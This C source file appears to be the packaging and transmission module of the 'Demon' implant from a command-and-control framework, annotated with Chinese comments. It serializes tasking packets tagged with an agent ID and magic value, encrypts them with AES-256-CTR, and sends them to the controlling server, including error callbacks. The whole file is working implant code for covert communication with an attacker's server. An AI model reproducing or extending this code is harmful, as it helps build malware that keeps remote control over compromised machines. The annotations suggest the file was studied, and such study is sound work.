/* Import Core Headers */
#include <Core/Package.h>
#include <Core/MiniStd.h>
#include <Core/Command.h>
#include <Core/Transport.h>

/* Import Crypto Header (enable CTR Mode) */
#define CTR    1
#define AES256 1
#include <Crypt/AesCrypt.h>

VOID Int64ToBuffer( PUCHAR Buffer, UINT64 Value )
{
    Buffer[ 7 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 6 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 5 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 4 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 3 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 2 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 1 ] = Value & 0xFF;
    Value >>= 8;

    Buffer[ 0 ] = Value & 0xFF;
}

// 将int32数据转换为Buffer，自行处理大小端
VOID Int32ToBuffer( PUCHAR Buffer, UINT32 Size )
{
    ( Buffer ) [ 0 ] = ( Size >> 24 ) & 0xFF;
    ( Buffer ) [ 1 ] = ( Size >> 16 ) & 0xFF;
    ( Buffer ) [ 2 ] = ( Size >> 8  ) & 0xFF;
    ( Buffer ) [ 3 ] = ( Size       ) & 0xFF;
}

// 向PACKAGE结构体中添加int32数据，添加到Buffer中
// Buffer会调用LocalReAlloc来重新分配
VOID PackageAddInt32( PPACKAGE Package, UINT32 dataInt )
{
    if ( ! Package )
        return;

    Package->Buffer = Instance.Win32.LocalReAlloc(
            Package->Buffer,
            Package->Length + sizeof( UINT32 ),
            LMEM_MOVEABLE
    );

    Int32ToBuffer( Package->Buffer + Package->Length, dataInt );

    Package->Size   =   Package->Length;
    Package->Length +=  sizeof( UINT32 );
}

VOID PackageAddInt64( PPACKAGE Package, UINT64 dataInt )
{
    if ( ! Package )
        return;

    Package->Buffer = Instance.Win32.LocalReAlloc(
            Package->Buffer,
            Package->Length + sizeof( UINT64 ),
            LMEM_MOVEABLE
    );

    Int64ToBuffer( Package->Buffer + Package->Length, dataInt );

    Package->Size   =  Package->Length;
    Package->Length += sizeof( UINT64 );
}

// 向PACKAGE结构体中添加数据，添加到Buffer中
VOID PackageAddPad( PPACKAGE Package, PUCHAR Data, SIZE_T Size )
{
    if ( ! Package )
        return;

    Package->Buffer = Instance.Win32.LocalReAlloc(
            Package->Buffer,
            Package->Length + Size,
            LMEM_MOVEABLE | LMEM_ZEROINIT
    );

    MemCopy( Package->Buffer + ( Package->Length ), Data, Size );

    Package->Size   =  Package->Length;
    Package->Length += Size;
}


VOID PackageAddBytes( PPACKAGE Package, PUCHAR Data, SIZE_T Size )
{
    if ( ! Package )
        return;

    PackageAddInt32( Package, Size );

    Package->Buffer = Instance.Win32.LocalReAlloc(
            Package->Buffer,
            Package->Length + Size,
            LMEM_MOVEABLE | LMEM_ZEROINIT
    );

    Int32ToBuffer( Package->Buffer + ( Package->Length - sizeof( UINT32 ) ), Size );

    MemCopy( Package->Buffer + Package->Length, Data, Size );

    Package->Size   =   Package->Length;
    Package->Length +=  Size;
}

// For callback to server
// 创建PACKAGE结构体，并插入数据，CommandID决定了当前包的任务类型
PPACKAGE PackageCreate( UINT32 CommandID )
{
    PPACKAGE Package = NULL;

    Package            = Instance.Win32.LocalAlloc( LPTR, sizeof( PACKAGE ) );
    Package->Buffer    = Instance.Win32.LocalAlloc( LPTR, sizeof( BYTE ) );
    Package->Length    = 0;
    Package->CommandID = CommandID;
    Package->Encrypt   = TRUE;
    Package->Destroy   = TRUE;

    PackageAddInt32( Package, 0 ); // 整个包的长度，后面会填充
    PackageAddInt32( Package, DEMON_MAGIC_VALUE ); // 用于标识当前是Demon
    PackageAddInt32( Package, Instance.Session.AgentID );
    PackageAddInt32( Package, CommandID );

    return Package;
}

PPACKAGE PackageNew()
{
    PPACKAGE Package = NULL;

    Package          = Instance.Win32.LocalAlloc( LPTR, sizeof( PACKAGE ) );
    Package->Buffer  = Instance.Win32.LocalAlloc( LPTR, 0 );
    Package->Length  = 0;
    Package->Encrypt = FALSE;
    Package->Destroy = TRUE;

    PackageAddInt32( Package, 0 );

    return Package;
}

VOID PackageDestroy( PPACKAGE Package )
{
    if ( ! Package )
        return;

    if ( ! Package->Buffer )
    {
        PUTS( "! Package->Buffer" )
        return;
    }

    MemSet( Package->Buffer, 0, Package->Length );
    Instance.Win32.LocalFree( Package->Buffer );
    Package->Buffer = NULL;

    MemSet( Package, 0, sizeof( PACKAGE ) );
    Instance.Win32.LocalFree( Package );
    Package = NULL;
}

// 将PACKAGE结构体中的数据发送到服务器，并接收服务器返回的数据
// 调整Package的数据
BOOL PackageTransmit( PPACKAGE Package, PVOID* Response, PSIZE_T Size )
{
    AESCTX AesCtx  = { 0 };
    BOOL   Success = FALSE;

    if ( Package )
    {
        if ( ! Package->Buffer )
        {
            PUTS( "Package->Buffer is empty" )
            return FALSE;
        }

        // writes package length to buffer
        // 将整个包的长度写入Package Buffer的前4个字节
        Int32ToBuffer( Package->Buffer, Package->Length - sizeof( UINT32 ) );

        if ( Package->Encrypt )
        {
            UINT32 Padding = sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 );

            if ( Package->CommandID == DEMON_INITIALIZE ) // only add these on init or key exchange
                Padding += 32 + 16;

            // Metadata没有加密并且CommandID不是DEMON_INITIALIZE时，才会加密
            if ( !( Instance.IsMetadataEncrypted && Package->CommandID == DEMON_INITIALIZE ) )
            {
                AesInit( &AesCtx, Instance.Config.AES.Key, Instance.Config.AES.IV );
                AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
            }

            // 默认DEMON_INITIALIZED是加密的
            if (Package->CommandID == DEMON_INITIALIZE)
                Instance.IsMetadataEncrypted = TRUE;
        }

        if ( TransportSend( Package->Buffer, Package->Length, Response, Size ) )
            Success = TRUE;

        if ( Package->Destroy )
            PackageDestroy( Package );
    }
    else
    {
        PUTS( "Package is empty" )
        Success = FALSE;
    }

    return Success;
}

// 想服务器回传错误信息
VOID PackageTransmitError( UINT32 ID, UINT32 ErrorCode )
{
    PRINTF( "Transmit Error: %d\n", ErrorCode );
    PPACKAGE Package = PackageCreate( DEMON_ERROR );

    PUTS( "Add Error ID" )
    PackageAddInt32( Package, ID );
    PUTS( "Add Error Code" )
    PackageAddInt32( Package, ErrorCode );
    PUTS( "Send Error" )
    PackageTransmit( Package, NULL, NULL );
    PUTS( "Send" )
}

